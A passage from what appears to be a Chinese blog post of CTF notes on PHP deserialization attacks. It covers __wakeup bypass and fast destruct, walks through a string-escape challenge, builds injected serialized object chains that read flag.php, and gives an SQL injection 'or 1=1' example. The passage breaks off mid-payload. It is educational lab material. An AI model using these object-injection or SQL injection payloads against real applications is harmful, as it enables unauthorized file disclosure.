class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Seri</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$alize</span>;<br>    <span class="hljs-comment">// public function __construct($alize) &#123;</span><br>    <span class="hljs-comment">//     $this-&gt;alize = $alize;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;alize-&gt;<span class="hljs-title function_ invoke__">getFlag</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t2</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Another construction!!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;f = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;t1 = <span class="hljs-variable language_">$this</span>-&gt;t2 = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;t2 = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t1;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t2;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;t1 === <span class="hljs-variable language_">$this</span>-&gt;t2)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;f))&#123;<br>                <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;f,<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;niubi&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no&quot;</span>;<br>        &#125;<br>    &#125;<br>    <br>&#125;<br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$p</span>)) &#123;<br>    <span class="hljs-variable">$p</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$p</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-comment">// echo &quot;NONONO&quot;;</span><br>&#125;<br><br><span class="hljs-comment">// $a = new Seri;</span><br><span class="hljs-comment">// $b = new Flag;  注意使用该语句生成payload的时候要把本地的方法禁用</span><br><span class="hljs-comment">// $a -&gt; alize = $b;</span><br><span class="hljs-comment">// $b -&gt; t1 = &amp;$b -&gt; t2; </span><br><span class="hljs-comment">// $b -&gt; f = &#x27;flag.php&#x27;;</span><br><span class="hljs-comment">// echo serialize($a);</span><br></code></pre></td></tr></table></figure><p><img src="/.com//17476565317604900775680869431296-20250519200852-08dr7rx.png" alt="17476565317604900775680869431296"></p><p>但是本道题因为是rand函数 随机生成的范围有限</p><p>所以可以随意设置一个范围内的数字 然后通过bp进行爆破</p><hr><h1 id="畸形序列化字符串"><a href="#畸形序列化字符串" class="headerlink" title="畸形序列化字符串"></a>畸形序列化字符串</h1><h4 id="应用领域"><a href="#应用领域" class="headerlink" title="应用领域"></a>应用领域</h4><ol><li>绕过__wakeup（）</li><li>fast destruct快速析构</li></ol><h5 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h5><p>在老版本的php中对序列化的结果的对象属性值+n</p><h5 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast destruct"></a>fast destruct</h5><p>类需要利用析构方法进行某种操作（帮助你去拿flag），但是在析构之前会调用一些方法进行过滤或干扰，常见的出题形式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br><span class="hljs-variable">$obj</span> -&gt; <span class="hljs-title function_ invoke__">safe_filter</span>();    <span class="hljs-comment">//调用一个进行安全检查的方法</span><br></code></pre></td></tr></table></figure><p><strong>快速析构的原理：</strong></p><p>当php接收到畸形序列化字符串时，PHP由于其容错机制，依然可以反序列化成功；</p><p>但是由于给的是一个畸形的反序列化字符串，是不标准的，php对这个畸形序列化字符串得到的<strong>对象</strong>不放心，会赶紧把该<strong>对象</strong>清除掉，就会触发其析构方法。</p><p>这样就会提前触发析构方法，不需要等到所用语句都执行结束，也就可以避免一些安全检查方法的调用。</p><hr><h1 id="0708反序列化字符逃逸"><a href="#0708反序列化字符逃逸" class="headerlink" title="0708反序列化字符逃逸"></a>0708反序列化字符逃逸</h1><h3 id="开篇例题："><a href="#开篇例题：" class="headerlink" title="开篇例题："></a>开篇例题：</h3><h4 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h4><p><a href="http://122.114.252.87:2030/">http://122.114.252.87:2030/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;index.php&quot;</span>);<br><span class="hljs-comment">//函数作用：把0*0 替换为\0\0\0  因为后面这个内容是在单引号里面包裹 所以斜杠就是斜杠  但是如果在双引号里面包裹就会变成转义字符</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>    <span class="hljs-comment">//关键所在这里的替换字符数不等长  3到6字符的替换</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>) . <span class="hljs-string">&#x27;*&#x27;</span> . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>    <span class="hljs-comment">//6到3字符的替换</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>) . <span class="hljs-string">&#x27;*&#x27;</span> . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$a</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$b</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;world&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-string">&#x27;hello&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-comment">//flag.php</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;c);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;nice&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-comment">//关于read和write函数 如果可以保证外层替换的字符串存在  内层的不存在  就可以只触发外层函数</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)))); <br></code></pre></td></tr></table></figure><p>对于双引号和单引号的测试如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">php -a   <span class="hljs-comment">//直接在cmd中输入 会启动php</span><br><br>php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;\n&#x27;</span>;<br>\n               <span class="hljs-comment">//单引号是什么就输出什么</span><br>php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>                <span class="hljs-comment">//转义后只有换行</span><br>php &gt;<br></code></pre></td></tr></table></figure><p>类比sql注入中的逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">select * <span class="hljs-keyword">from</span> users where u=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> p=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">//进行逃逸</span><br>select * <span class="hljs-keyword">from</span> users where u=<span class="hljs-string">&#x27;\&#x27; and p=&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;  //单引号会被转义掉</span><br><span class="hljs-string">=&gt; select * from users where u=&#x27;</span> <span class="hljs-keyword">and</span> p=<span class="hljs-string">&#x27; or 1=1&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="本质："><a href="#本质：" class="headerlink" title="本质："></a>本质：</h4><p>对序列化字符串进行不等长的字符串替换，导致本来属于普通字符串的一部分字符串变成了序列化的一部分，或者导致本来不属于字符串的一部分变成了字符串的一部分，进而造成了序列化数据的错乱，导致了对象注入。</p><h4 id="解题：-1"><a href="#解题：-1" class="headerlink" title="解题："></a>解题：</h4><p>获取A的序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;UN&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;PW&quot;</span>;<br>    <br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> A)<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;UN&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;PW&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>获取BC的序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;world&#x27;</span>;<br>    <span class="hljs-comment">// function __destruct()&#123;</span><br>    <span class="hljs-comment">//      字符串的拼接触发toString </span><br>    <span class="hljs-comment">//      $c = &#x27;hello&#x27;.$this-&gt;b;</span><br>    <span class="hljs-comment">//     //echo类的对象会触发toString方法</span><br>    <span class="hljs-comment">//     echo $c;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-comment">// function __toString()&#123;</span><br>    <span class="hljs-comment">//     //flag.php</span><br>    <span class="hljs-comment">//     echo file_get_contents($this-&gt;c);</span><br>    <span class="hljs-comment">//     return &#x27;nice&#x27;;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> B;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> C;<br><span class="hljs-variable">$b</span> -&gt; b = <span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>)<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><p>接下来需要把BC读取flag的序列化结果填入到A中</p><p>首先对于序列化的属性进行讲解：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">3</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;张三&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;李四&quot;</span>;i:<span class="hljs-number">2</span>;i:<span class="hljs-number">18</span>;&#125;<br></code></pre></td></tr></table></figure><p>简单说明下序列化字符串</p><p>a:3 ——&gt; 代表集合中有3个元素，a则是array类型（o则是object，s则是string，i则是integer等等）</p><p>i:0;s:6:”张三” ——&gt; i:0则是第一个元素，s:6则是string，字符串长度为6，元素是张三</p><p>i:2;i:18 ——&gt; i:2则是第三个元素，i:18则是int，整数不计算长度，元素是18</p><blockquote><p>a – array<br>b – boolean<br>d – double<br>i – integer<br>o – common object<br>r – reference<br>s – string<br>C – custom object<br>O – class<br>N – null<br>R – pointer reference<br>U – unicode string<br>N 表示的是 NULL</p></blockquote><p>所以把我们生成的两个序列化放到一起研究如何利用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;UN&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;PW&quot;</span>;&#125;<br><span class="hljs-keyword">object</span> 一个 为A类 中有两个成员 <br>    第一个是<span class="hljs-keyword">string</span>型 长度为<span class="hljs-number">8</span> 名为username 其值为<span class="hljs-keyword">string</span>型长度为<span class="hljs-number">2</span> 值为UN <br>    第二个是<span class="hljs-keyword">string</span>型 长度为<span class="hljs-number">8</span> 名为password 其值为<span class="hljs-keyword">string</span>型长度为<span class="hljs-number">2</span> 值为PW<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;&#125;<br><span class="hljs-keyword">object</span> 一个 为B类 中有一个成员<br>    第一个为<span class="hljs-keyword">string</span>型 长度为<span class="hljs-number">1</span> 名为b <br>    其值为<span class="hljs-keyword">object</span>型 一个 值为C 其中包含一个成员 <span class="hljs-keyword">string</span>型 名为c 其值为<span class="hljs-keyword">string</span>型长度为<span class="hljs-number">8</span> 值为flag.php<br></code></pre></td></tr></table></figure><p>拼接：BC 填入到 A中 因为函数执行的是A的对象 把PW给删了 分号结尾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;属性s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;属性的值s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;UN&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot; 补一个分号结尾;这些全部吃掉 把password约束吃掉的结果 作为username的值  这里缺少属性 补一个 属性s:8:&quot;</span>password<span class="hljs-string">&quot;;属性的值（object型）O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;O:1:&quot;</span>C<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>c<span class="hljs-string">&quot;;s:8:&quot;</span>flag.php<span class="hljs-string">&quot;;&#125;&#125; 这里的两个符号&quot;</span>;也多余了 补充保证格式正确s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">0</span><span class="hljs-string">&quot;&quot;</span>; &#125;<br></code></pre></td></tr></table></figure><p>添加到PW的位置后我们发现 一个双引号后面直接来了个O有些突兀</p><p>直接放到函数中进行生成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;UN&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;s:0:&quot;&quot;;s:0&quot;&#x27;</span>;<br>   <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> A)<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>即为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;UN&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">82</span>:<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;O:1:&quot;</span>C<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>c<span class="hljs-string">&quot;;s:8:&quot;</span>flag.php<span class="hljs-string">&quot;;&#125;&#125;s:0:&quot;</span><span class="hljs-string">&quot;;s:0&quot;</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>然后去考虑如何才能吃掉：</p><p>替换规则是\0\0\0 替换为0*0 是六到三的替换</p><p>也就是每一组替换可以吃掉3个长度的字符</p><p>需要吃掉的内容：”;s:8:”password”;s:82:</p><p>用python测一下长度</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt; <span class="hljs-title function_ invoke__">len</span>(<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;&quot;;s:8:&quot;password&quot;;s:82:&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-number">22</span><br>&gt;&gt;&gt; <span class="hljs-number">22</span>/<span class="hljs-number">3</span><br><span class="hljs-number">7.333333333333333</span><br></code></pre></td></tr></table></figure><p>不是3的整数倍 所以需要自己添加值凑成3的倍数</p><p>把前面的UN也吃掉就好了：UN”;s:8:”password”;s:82:</p><p>然后继续利用python生成\0\0\0 共8组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt; <span class="hljs-string">&#x27;\0\0\0&#x27;</span><br><span class="hljs-string">&#x27;\x00\x00\x00&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-string">&#x27;\\0\\0\\0&#x27;</span><br><span class="hljs-string">&#x27;\\0\\0\\0&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-string">&#x27;\\0\\0\\0&#x27;</span> * <span class="hljs-number">8</span><br><span class="hljs-string">&#x27;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#x27;</span><br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><p>因为转义 所以双杠后自己替换一下就好了</p><p>因为决定某个值的长度不是双引号的闭合 而是前面的数字</p><p>所以把我们生成的替换字符放进去就会多读取后面的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0xx&#x27;</span>;  <span class="hljs-comment">//后面补充两个字符 因为24-22=2 去补充</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;s:0:&quot;&quot;;s:0&quot;&#x27;</span>;<br>   <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> A)<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">50</span>:<span class="hljs-string">&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0xx&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">82</span>:<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;O:1:&quot;</span>C<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>c<span class="hljs-string">&quot;;s:8:&quot;</span>flag.php<span 